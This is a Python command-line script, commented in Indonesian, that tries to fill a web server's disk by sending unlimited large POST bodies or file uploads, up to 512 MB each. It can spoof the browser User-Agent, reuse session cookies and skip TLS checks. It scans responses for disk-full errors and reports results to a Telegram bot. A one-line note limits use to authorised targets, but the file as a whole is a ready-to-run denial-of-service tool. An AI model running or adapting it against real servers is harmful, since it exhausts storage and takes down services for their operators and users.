#!/usr/bin/env python3
"""
Disk exhaustion tester via large POST payloads.
Gunakan hanya terhadap target yang sudah diotorisasi.
"""

import argparse
import itertools
import os
import sys
import time

import requests
from dotenv import load_dotenv
from requests.exceptions import RequestException

load_dotenv()

# Matikan warning SSL jika target pakai cert self-signed
# import urllib3
# urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")


def send_telegram_notification(message: str, token: str, chat_ids_str: str):
    chat_ids = [cid.strip() for cid in chat_ids_str.split(",") if cid.strip()]
    for chat_id in chat_ids:
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        payload = {
            "chat_id": chat_id,
            "text": message,
            "parse_mode": "HTML",
        }
        try:
            response = requests.post(url, data=payload, timeout=10)
            if response.ok:
                print(
                    f"  [TELEGRAM] Notifikasi terkirim ke Chat ID: {chat_id}")
            else:
                print(
                    f"  [TELEGRAM] Gagal mengirim ke {chat_id}: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"  [TELEGRAM] Error ke {chat_id}: {e}")


def build_payload(size_mb: int) -> bytes:
    """Buat payload teks ~size_mb megabyte."""
    chunk = b"A" * (1024 * 1024)  # 1 MB
    return chunk * size_mb


def send_loop(args):
    session = requests.Session()
    session.verify = False
    session.headers.update({
        "User-Agent": args.ua,
        "Content-Type": args.content_type,
    })

    # Cookie opsional
    if args.cookie:
        for part in args.cookie.split(";"):
            part = part.strip()
            if "=" in part:
                key, val = part.split("=", 1)
                session.cookies[key.strip()] = val.strip()

    payload = build_payload(args.size)
    print(f"[*] Payload size : {len(payload)} bytes ({args.size} MB)")
    print(f"[*] Target       : {args.url}")
    print(f"[*] Field        : {args.field}")
    print(
        f"[*] Cookie       : {args.cookie if args.cookie else '(kosong / session)'}")
    print(
        f"[*] Delay        : {args.delay}s | max requests: {args.count or 'unlimited'}")
    print("-" * 60)

    sent = 0
    success = 0
    failed = 0
    total_bytes = 0
    start = time.time()
    full_detected = False

    for i in itertools.count(1):
        if args.count and i > args.count:
            break

        try:
            if args.as_file:
                files = {
                    args.field: (
                        f"payload_{i}.txt",
                        payload,
                        "text/plain",
                    )
                }
                data = None
                body = files
                resp = session.post(
                    args.url,
                    files=files,
                    timeout=args.timeout,
                    allow_redirects=True,
                )
            else:
                data = {args.field: payload.decode("ascii")}
                resp = session.post(
                    args.url,
                    data=data,
                    timeout=args.timeout,
                    allow_redirects=True,
                )

            sent += 1
            total_bytes += len(payload)
            elapsed = time.time() - start
            rate = (total_bytes / (1024 * 1024)) / elapsed if elapsed else 0

            if resp.status_code == 200:
                success += 1
            else:
                failed += 1

            print(
                f"[{i:04d}] HTTP {resp.status_code} | "
                f"{len(resp.content)} B resp | "
                f"total {total_bytes / (1024**3):.2f} GB | "
                f"{rate:.2f} MB/s"
            )

            # Indikasi disk penuh / write gagal
            body_l = resp.text.lower()
            if resp.status_code in (500, 507, 503) or any(
                k in body_l
                for k in (
                    "no space",
                    "disk full",
                    "quota",
                    "enospc",
                    "insufficient storage",
                    "write failed",
                )
            ):
                print(
                    f"[!] Kemungkinan disk/quota habis (status {resp.status_code})")
                print(resp.text[:500])
                full_detected = True
                if args.stop_on_error:
                    break

        except RequestException as e:
            print(f"[{i:04d}] ERROR: {e}")
            failed += 1
            sent += 1
            if args.stop_on_error:
                break
            time.sleep(args.delay * 2)
            continue

        time.sleep(args.delay)

    elapsed = time.time() - start
    success_rate = (success / sent * 100) if sent > 0 else 0
    print("-" * 60)
    print(
        f"[*] Selesai. {sent} request, {total_bytes / (1024**3):.2f} GB dalam {elapsed:.1f}s")
    print(
        f"[*] ✅ Berhasil: {success} | ❌ Gagal: {failed} | 📈 {success_rate:.2f}%")

    # Kirim notifikasi Telegram
    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
        status_label = "🛑 DISK PENUH / ERROR" if full_detected else "✅ Selesai Normal"
        summary_message = (
            f"<b>📤 LAPORAN POST DISK FILL</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🟢 <b>Berhasil:</b> {success}\n"
            f"🔴 <b>Gagal:</b> {failed}\n"
            f"📥 <b>Total Request:</b> {sent}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📦 <b>Ukuran Payload:</b> {args.size} MB\n"
            f"💿 <b>Total Data Terkirim:</b> {total_bytes / (1024**3):.2f} GB\n"
            f"⏱️ <b>Waktu Eksekusi:</b> {elapsed:.1f} detik\n"
            f"📈 <b>Tingkat Keberhasilan:</b> {success_rate:.2f}%\n"
            f"🎯 <b>Target:</b> {args.url}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{status_label}"
        )
        send_telegram_notification(
            summary_message, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID)


def main():
    p = argparse.ArgumentParser(description="Large POST disk-fill tester")
    p.add_argument("-u", "--url", required=True, help="URL endpoint POST")
    p.add_argument("-f", "--field", default="data",
                   help="Nama field form (default: data)")
    p.add_argument("-s", "--size", type=int, default=20,
                   help="Ukuran payload per request (MB)")
    p.add_argument("-c", "--count", type=int, default=0,
                   help="Jumlah request (0 = unlimited)")
    p.add_argument("-d", "--delay", type=float, default=0.2,
                   help="Delay antar request (detik)")
    p.add_argument("-t", "--timeout", type=int,
                   default=60, help="Timeout request")
    p.add_argument("--as-file", action="store_true",
                   help="Kirim sebagai multipart file upload")
    p.add_argument("--cookie", default="",
                   help="Session cookie (opsional, contoh: PHPSESSID=abc123)")
    p.add_argument("--content-type",
                   default="application/x-www-form-urlencoded",
                   help="Content-Type (diabaikan jika --as-file)",
                   )
    p.add_argument(
        "--ua",
        default="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        help="User-Agent",
    )
    p.add_argument(
        "--stop-on-error",
        action="store_true",
        help="Berhenti saat error / indikasi disk penuh",
    )
    args = p.parse_args()

    if args.size < 1 or args.size > 512:
        sys.exit("[-] --size harus 1–512 MB")

    send_loop(args)


if __name__ == "__main__":
    main()
